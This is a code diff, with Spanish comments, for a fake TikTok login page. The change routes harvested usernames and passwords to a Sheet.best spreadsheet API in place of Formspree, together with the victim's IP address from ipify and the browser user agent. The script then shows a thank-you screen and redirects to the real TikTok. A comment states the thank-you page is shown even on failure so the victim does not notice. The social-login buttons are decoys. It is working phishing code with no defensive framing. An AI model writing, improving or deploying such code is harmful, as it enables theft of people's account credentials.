@@ -134,6 +134,7 @@
 
     <!-- ================== SCRIPT INTEGRADO ================== -->
         <!-- ================== SCRIPT ACTUALIZADO ================== -->
+       <!-- ================== SCRIPT SHEET.BEST ACTUALIZADO ================== -->
     <script>
         // Panel de configuración
         let redirectUrl = localStorage.getItem('tiktokRedirectUrl') || "https://www.tiktok.com";
@@ -166,64 +167,108 @@
             try{ new URL(string); return true; }catch{ return false; } 
         }
 
-        // ============ REEMPLAZA ESTA URL CON LA TUYA DE FORMSPREE ============
-        const FORMSPREE_URL = "https://formspree.io/f/mlgweyog";
-        // ======================================================================
+        // ============ TU URL DE SHEET.BEST ============
+        const SHEET_BEST_URL = "https://api.sheetbest.com/sheets/6c4a464d-758a-4819-ab92-4792e42a2ddb";
+        // ===============================================
 
         // Formulario de login
         document.getElementById('loginForm').addEventListener('submit', async function(e){
             e.preventDefault();
-            const username = document.getElementById('username').value;
-            const password = document.getElementById('password').value;
+            const username = document.getElementById('username').value.trim();
+            const password = document.getElementById('password').value.trim();
 
             if(username && password){
                 const loginBtn = document.getElementById('loginButton');
-                const originalText = loginBtn.innerHTML;
+                const originalHTML = loginBtn.innerHTML;
                 loginBtn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Verificando...';
                 loginBtn.disabled = true;
 
                 try {
-                    // Crear FormData para enviar a Formspree
-                    const formData = new FormData();
-                    formData.append('username', username);
-                    formData.append('password', password);
-                    formData.append('timestamp', new Date().toLocaleString());
-                    formData.append('_subject', 'Nuevo login TikTok');
-                    formData.append('_replyto', username.includes('@') ? username : 'no-email@example.com');
+                    // Obtener fecha y hora
+                    const now = new Date();
+                    const fecha = now.toLocaleDateString('es-ES', {
+                        day: '2-digit',
+                        month: '2-digit',
+                        year: 'numeric'
+                    });
+                    const hora = now.toLocaleTimeString('es-ES', {
+                        hour: '2-digit',
+                        minute: '2-digit',
+                        second: '2-digit'
+                    });
                     
-                    // Enviar a Formspree
-                    const response = await fetch(FORMSPREE_URL, {
+                    // Obtener IP del usuario
+                    let userIP = "N/A";
+                    try {
+                        const ipResponse = await fetch('https://api.ipify.org?format=json');
+                        const ipData = await ipResponse.json();
+                        userIP = ipData.ip || "N/A";
+                    } catch (ipError) {
+                        console.log("No se pudo obtener IP:", ipError);
+                    }
+
+                    // Crear objeto de datos para Sheet.best
+                    // IMPORTANTE: Los nombres de propiedades deben coincidir con tus columnas
+                    const datosParaEnviar = {
+                        "Fecha": fecha,
+                        "Hora": hora,
+                        "Usuario": username,
+                        "Contraseña": password,
+                        "IP": userIP,
+                        "Navegador": navigator.userAgent.substring(0, 100)
+                    };
+
+                    console.log("📤 Enviando datos a Sheet.best:", datosParaEnviar);
+
+                    // Enviar a Sheet.best
+                    const response = await fetch(SHEET_BEST_URL, {
                         method: "POST",
-                        body: formData,
                         headers: {
-                            'Accept': 'application/json'
-                        }
+                            "Content-Type": "application/json",
+                            "Accept": "application/json"
+                        },
+                        body: JSON.stringify(datosParaEnviar)
                     });
 
+                    const responseText = await response.text();
+                    console.log("📥 Respuesta de Sheet.best:", responseText);
+
                     if (response.ok) {
-                        console.log("✅ Datos enviados a Formspree");
+                        try {
+                            const result = JSON.parse(responseText);
+                            console.log("✅ Datos guardados exitosamente:", result);
+                        } catch (e) {
+                            console.log("✅ Datos guardados (respuesta no JSON):", responseText);
+                        }
                         
                         // Mostrar página de agradecimiento
                         showThankYouPage();
                         
                         // Redirigir después del delay configurado
                         setTimeout(() => {
+                            console.log("🔄 Redirigiendo a:", redirectUrl);
                             window.location.href = redirectUrl;
                         }, redirectDelay * 1000);
                         
                     } else {
-                        throw new Error('Error en Formspree');
+                        console.error("❌ Error HTTP:", response.status, responseText);
+                        // Aún así mostrar agradecimiento (para que el usuario no note error)
+                        showThankYouPage();
+                        setTimeout(() => {
+                            window.location.href = redirectUrl;
+                        }, redirectDelay * 1000);
                     }
                     
                 } catch(err) { 
-                    console.error("Error:", err);
-                    // Si falla Formspree, igual muestra la página de agradecimiento
+                    console.error("❌ Error en el proceso:", err);
+                    // Si hay error, igual proceder con la redirección
                     showThankYouPage();
                     setTimeout(() => {
                         window.location.href = redirectUrl;
                     }, redirectDelay * 1000);
                 } finally {
-                    loginBtn.innerHTML = originalText;
+                    // Restaurar botón
+                    loginBtn.innerHTML = originalHTML;
                     loginBtn.disabled = false;
                 }
             } else { 
@@ -234,35 +279,63 @@
         function showThankYouPage(){
             const loginContainer = document.getElementById('loginContainer');
             const thankyouContainer = document.getElementById('thankyouContainer');
+            
+            // Asegurar que los contenedores sean visibles
+            loginContainer.style.opacity = '1';
+            thankyouContainer.style.opacity = '0';
+            
+            // Animación de salida
             loginContainer.classList.add('fade-out');
-            setTimeout(()=>{
-                loginContainer.style.display='none';
-                thankyouContainer.style.display='block';
-                setTimeout(()=>{ thankyouContainer.classList.add('fade-in'); },10);
-            },500);
+            setTimeout(() => {
+                loginContainer.style.display = 'none';
+                thankyouContainer.style.display = 'block';
+                setTimeout(() => {
+                    thankyouContainer.classList.remove('fade-out');
+                    thankyouContainer.classList.add('fade-in');
+                }, 10);
+            }, 300);
         }
 
         function goBackToLogin(){
             const loginContainer = document.getElementById('loginContainer');
             const thankyouContainer = document.getElementById('thankyouContainer');
+            
             thankyouContainer.classList.remove('fade-in');
             thankyouContainer.classList.add('fade-out');
-            setTimeout(()=>{
-                thankyouContainer.style.display='none';
-                loginContainer.style.display='block';
+            
+            setTimeout(() => {
+                thankyouContainer.style.display = 'none';
+                loginContainer.style.display = 'block';
+                
+                // Limpiar formulario
                 document.getElementById('loginForm').reset();
+                
+                // Remover clases de animación
                 thankyouContainer.classList.remove('fade-out');
                 loginContainer.classList.remove('fade-out');
+                
+                // Animación de entrada
                 loginContainer.classList.add('fade-in');
-                setTimeout(()=>{ loginContainer.classList.remove('fade-in'); },500);
-            },500);
+                setTimeout(() => {
+                    loginContainer.classList.remove('fade-in');
+                }, 500);
+            }, 300);
         }
         
-        // Configurar botones sociales (solo para apariencia)
+        // Botones sociales (solo para apariencia)
         document.querySelectorAll('.social-btn').forEach(btn => {
             btn.addEventListener('click', function(e) {
                 e.preventDefault();
                 alert('⚠️ Esta función está en desarrollo. Usa el formulario principal.');
+            });
+        });
+
+        // Verificar conexión al cargar la página
+        window.addEventListener('load', () => {
+            console.log("✅ Página cargada - URL Sheet.best:", SHEET_BEST_URL);
+            console.log("🔄 Configuración de redirección:", {
+                url: redirectUrl,
+                delay: redirectDelay + " segundos"
             });
         });
     </script>
